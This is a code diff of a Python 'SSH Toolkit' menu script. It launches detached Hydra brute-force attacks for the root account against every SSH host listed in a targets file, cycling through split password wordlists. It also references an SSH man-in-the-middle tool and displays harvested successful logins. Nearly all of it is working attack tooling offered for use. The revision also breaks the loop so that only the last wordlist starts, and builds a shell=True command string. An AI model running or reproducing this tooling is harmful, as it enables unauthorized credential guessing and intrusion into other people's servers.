@@ -5,7 +5,8 @@ import os
 import time
 import signal
 loopControl = True
-
+active_count = 0
+finished_count = 0
 while loopControl:
     print("\n========================================")
     print("SSH Toolkit:         ")
@@ -38,10 +39,10 @@ while loopControl:
         wordlists = sorted(glob.glob("passwords/hydra_split_*.txt"))
         targets = "targets/ips.txt"
         if not os.path.isfile(targets):
-            print("ADD SOME TARGETS FIRST")
+            print("ADD SOME TARGETS FIRST...exiting")
             sys.exit()
         if os.path.getsize(targets) ==0:
-            print(f"ADD SOME TARGETS FIRST")
+            print(f"ADD SOME TARGETS FIRST...exiting")
             sys.exit()
         if not wordlists:
             print("\n[-] No wordlists found in 'passwords/' directory.")
@@ -52,44 +53,50 @@ while loopControl:
             print(f"\n[+] Found {len(wordlists)} wordlists.")
             print("[+] Starting background attacks...")
             print("    Note: Processes are detached. They survive script exit.\n")
-            
+        
             started_count = 0
             for wordlist in wordlists:
-                log_filename = f"output_logs/{os.path.basename(wordlist)}.log"
+          
+                base_name = os.path.basename(wordlist)
+
+                name_no_ext = os.path.splitext(base_name)[0]
+            
+           
+                login_log_filename = f"output_logs/{name_no_ext}_logins.log"
+                verbose_log_filename = f"output_logs/{name_no_ext}_verbose.log"
+                print(f"  Starting attack for: {base_name}")
+
+            
+                cmd = (
+                    f"/usr/bin/hydra -l root "
+                    f"-P \"{wordlist}\" "
+                    f"-M \"{targets}\" "
+                    f"ssh "
+                    f"-o \"{login_log_filename}\" "
+                    f"-vV "
+                    f"> \"{verbose_log_filename}\" 2>&1"
+                )
+
+            try:
+                p = subprocess.Popen(
+                    cmd,
+                    shell=True,     
+                    preexec_fn=os.setsid 
+                )
                 
-                print(f"  Starting attack for: {os.path.basename(wordlist)}")
+                pid_file = f"pids/{name_no_ext}.pid"
+                with open(pid_file, "w") as f:
+                    f.write(str(p.pid))
+                
+                print(f"    -> Started (PID: {p.pid})")
+                print(f"    -> Login Log: {login_log_filename}")
+                print(f"    -> Verbose Log: {verbose_log_filename}")
+                started_count += 1
 
-                cmd = [
-                    "hydra",
-                    "-l", "root",
-                    "-P", wordlist,
-                    "-M", "targets/ips.txt",
-                    "ssh",
-                    "-o", log_filename,
-                    "-vV"
-                ]
+            except Exception as e:
+                print(f"    -> Error starting {wordlist}: {e}")
 
-                try:
-                    p = subprocess.Popen(
-                        cmd,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.STDOUT,
-                        text=True,
-                        preexec_fn=os.setsid
-                    )
-                    
-                    pid_file = f"pids/{os.path.basename(wordlist)}.pid"
-                    with open(pid_file, "w") as f:
-                        f.write(str(p.pid))
-                    
-                    print(f"    -> Started (PID: {p.pid})")
-                    print(f"    -> Log: {log_filename}")
-                    started_count += 1
-
-                except Exception as e:
-                    print(f"    -> Error starting {wordlist}: {e}")
-
-            print(f"\n[+] {started_count} attacks started.")
+        print(f"\n[+] {started_count} attacks started.")
 
     elif user_choice == "2":
             appimage_path = "mitm/ssh-mitm-x86_64.AppImage"
@@ -123,7 +130,7 @@ while loopControl:
             print(f"[-] File not found: {targets_file}")
 
     elif user_choice == "4":
-        user_text = input("ENTER TARGET IP (e.g., 192.168.1.1): ")
+        user_text = input("ENTER TARGET IP: ")
         if user_text:
             with open("targets/ips.txt", "a") as f:
                 f.write(user_text + "\n")
@@ -171,67 +178,114 @@ while loopControl:
                     except ValueError:
                         print("[-] Invalid input.")
 
+    
     elif user_choice == "7":
         pid_dir = "pids"
         log_dir = "output_logs"
-        
+    
         os.makedirs(pid_dir, exist_ok=True)
         os.makedirs(log_dir, exist_ok=True)
 
         pid_files = glob.glob(f"{pid_dir}/*.pid")
-        
+    
         if not pid_files:
             print("\n--- No Active Background Attacks ---")
             print("(PID files not found in 'pids/' directory)")
         else:
             print("\n--- Status of Background Attacks ---")
             active_count = 0
-            
+            finished_count = 0
+        
             for pid_file in pid_files:
                 try:
                     with open(pid_file, "r") as f:
                         pid_str = f.read().strip()
-                    
+                
                     if not pid_str:
                         continue
-                        
-                    pid = int(pid_str)
-                    wordlist_name = os.path.basename(pid_file).replace(".pid", "")
                     
+                    pid = int(pid_str)
+                # The PID file is named like "hydra_split_1.pid"
+                    wordlist_base_name = os.path.basename(pid_file).replace(".pid", "")
+                
+                # Define the log files based on the naming convention from Option 2
+                    verbose_log_path = f"{log_dir}/{wordlist_base_name}_verbose.log"
+                    login_log_path = f"{log_dir}/{wordlist_base_name}_logins.log"
+
                     try:
                         os.kill(pid, 0)
                         active_count += 1
-                        print(f"\n[+] RUNNING: {wordlist_name} (PID: {pid})")
-                        
-                        log_file = f"{log_dir}/{wordlist_name}.log"
-                        if os.path.exists(log_file):
-                            with open(log_file, "r") as lf:
-                                lines = lf.readlines()
-                                if lines:
-                                    last_line = lines[-1].strip()
-                                    print(f"   Last Output: {last_line}")
-                                else:
-                                    print(f"   Last Output: (Waiting for first entry...)")
+                        print(f"\n[+] RUNNING: {wordlist_base_name} (PID: {pid})")
+                    
+                        if os.path.exists(verbose_log_path):
+                            try:
+                                with open(verbose_log_path, "r") as vf:
+                                    lines = vf.readlines()
+                                    if lines:
+                                        print(f"   [Verbose Progress] (Last 5 lines):")
+                                        for line in lines[-5:]:
+                                            clean_line = line.rstrip()
+                                            if clean_line:
+                                                print(f"      > {clean_line}")
+                                    else:
+                                        print(f"   [Verbose Progress]: (Waiting for output...)")
+                            except Exception:
+                                print(f"   [Verbose Progress]: (Error reading {verbose_log_path})")
                         else:
-                            print(f"   Last Output: (Log file: {log_file})")
+                            print(f"   [Verbose Progress]: (No verbose log found yet)")
+
+                        if os.path.exists(login_log_path):
+                            try:
+                                with open(login_log_path, "r") as lf:
+                                    raw_lines = lf.readlines()
+                                    login_lines = [l.strip() for l in raw_lines if l.strip() and not l.startswith('#')]
+                                
+                                    if login_lines:
+                                        print(f"   [Successful Logins] ({len(login_lines)} found):")
+                                        for line in login_lines[-3:]:
+                                            print(f"      ✓ {line}")
+                                    else:
+                                        print(f"   [Successful Logins]: (None yet)")
+                            except Exception:
+                                print(f"   [Successful Logins]: (Error reading {login_log_path})")
+                        else:
+                            print(f"   [Successful Logins]: (No login log found yet)")
 
                     except ProcessLookupError:
-                        print(f"\n[-] FINISHED: {wordlist_name} (PID: {pid})")
+                        finished_count += 1
+                        print(f"\n[-] FINISHED: {wordlist_base_name} (PID: {pid})")
+                    
+                   
+                        if os.path.exists(login_log_path):
+                            try:
+                                with open(login_log_path, "r") as lf:
+                                    raw_lines = lf.readlines()
+                                    login_lines = [l.strip() for l in raw_lines if l.strip() and not l.startswith('#')]
+                                
+                                    if login_lines:
+                                        print(f"   Final Successful Logins: {len(login_lines)}")
+                                        for line in login_lines[-3:]:
+                                            print(f"      ✓ {line}")
+                            except Exception:
+                                pass
+
                         try:
                             os.remove(pid_file)
                             print(f"   (Removed stale PID file)")
                         except OSError as rm_err:
                             print(f"   (Failed to remove PID file: {rm_err})")
+
                     except PermissionError:
-                        print(f"\n[?] RUNNING: {wordlist_name} (PID: {pid}) [Permission Denied]")
+                        print(f"\n[?] RUNNING: {wordlist_base_name} (PID: {pid}) [Permission Denied]")
 
                 except (ValueError, IOError) as e:
                     print(f"\n[?] ERROR: {os.path.basename(pid_file)} ({e})")
 
             if active_count > 0:
-                print(f"\n{active_count} attack(s) currently running.")
+                print(f"\n[+] {active_count} attack(s) currently running.")
             else:
-                print("\nAll attacks finished or crashed.")
+                print(f"\n[-] All {finished_count} attack(s) finished.")
+
     elif user_choice == "8":
         pid_dir = "pids"
         log_dir = "output_logs"
@@ -265,7 +319,7 @@ while loopControl:
                         
                     except ProcessLookupError:
                         print(f"[-] ALREADY FINISHED: {wordlist_name} (PID: {pid})")
-                        # Optionally remove orphaned PID file
+                       
                         os.remove(pid_file)
                     except PermissionError:
                         print(f"[?] PERMISSION DENIED: {wordlist_name} (PID: {pid})")
@@ -279,6 +333,7 @@ while loopControl:
                 print(f"\n{stopped_count} attack(s) stopped.")
             else:
                 print("\nNo new attacks were stopped.")
+        sys.exit()
     else:
         print("Invalid option selected.")
 
